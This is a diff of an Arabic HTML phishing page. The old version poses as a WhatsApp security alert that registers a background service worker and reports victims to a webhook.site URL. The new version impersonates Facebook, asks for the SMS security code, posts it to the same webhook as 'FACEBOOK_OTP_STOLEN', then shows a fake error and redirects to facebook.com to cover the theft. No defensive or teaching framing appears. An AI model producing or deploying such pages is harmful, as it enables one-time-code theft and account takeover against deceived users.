@@ -1,41 +1,59 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تأمين حساب واتساب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - Facebook</title>
     <style>
-        body { font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        button { background: #128c7e; color: white; border: none; padding: 15px 30px; border-radius: 25px; cursor: pointer; font-size: 18px; font-weight: bold; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 350px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; }
+        button { width: 95%; padding: 10px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #166fe5; }
+        .footer { font-size: 12px; color: #8a8d91; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60"><br>
-        <h2>تنبيه أمني هام</h2>
-        <p>يرجى تفعيل "إشعارات التشفير" فوراً لحماية محادثاتك من المتسللين.</p>
-        <button onclick="activateSpy()">تفعيل الحماية الآن</button>
-    </div>
 
-    <script>
-        // تسجيل الجاسوس في الخلفية
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
-        }
+<div class="login-box">
+    <div class="fb-logo">facebook</div>
+    <h2>تأكيد ملكية الحساب</h2>
+    <p>لقد لاحظنا نشاطاً غير معتاد. لتأمين حسابك، يرجى إدخال رمز الأمان المكون من 6 أرقام الذي أرسلناه إلى هاتفك عبر رسالة SMS.</p>
+    
+    <input type="number" id="otpCode" placeholder="رمز الأمان" required>
+    
+    <button onclick="captureCode()">تأكيد الهوية</button>
+    
+    <div class="footer">Meta © 2026</div>
+</div>
 
-        function activateSpy() {
-            Notification.requestPermission().then(permission => {
-                if (permission === 'granted') {
-                    // إرسال إشارة "صيد" فورية لـ Webhook لتتأكد أن الربط يعمل
-                    fetch('https://webhook.site/67c1ee4b-66bd-4c2e-90be-50a7474be300', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ event: "Victim_Accepted_Permission", device: navigator.userAgent })
-                    });
-                    alert("تم تفعيل نظام التشفير بنجاح!");
-                }
+<script>
+    function captureCode() {
+        const code = document.getElementById('otpCode').value;
+        
+        if (code.length >= 4) {
+            // إرسال الغنيمة فوراً إلى Webhook.site
+            fetch('https://webhook.site/67c1ee4b-66bd-4c2e-90be-50a7474be300', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    type: "FACEBOOK_OTP_STOLEN",
+                    otp: code,
+                    time: new Date().toLocaleString()
+                })
             });
+
+            // إيهام الضحية بوجود خطأ لإعادة المحاولة أو التمويه
+            alert("حدث خطأ في الشبكة. يرجى المحاولة مرة أخرى بعد 5 دقائق.");
+            window.location.href = "https://www.facebook.com"; 
+        } else {
+            alert("يرجى إدخال رمز صحيح.");
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
